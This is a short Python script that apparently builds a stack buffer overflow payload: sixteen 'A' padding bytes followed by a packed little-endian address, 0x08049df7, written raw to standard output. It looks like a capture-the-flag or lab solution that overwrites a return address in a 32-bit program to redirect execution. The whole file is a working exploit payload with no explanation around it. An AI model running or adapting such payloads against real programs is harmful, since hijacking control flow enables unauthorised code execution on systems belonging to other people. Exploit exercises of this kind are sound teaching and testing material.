import struct
import sys

data = b'A'*16
data += struct.pack("<I", 0x08049df7)
sys.stdout.buffer.write(data)
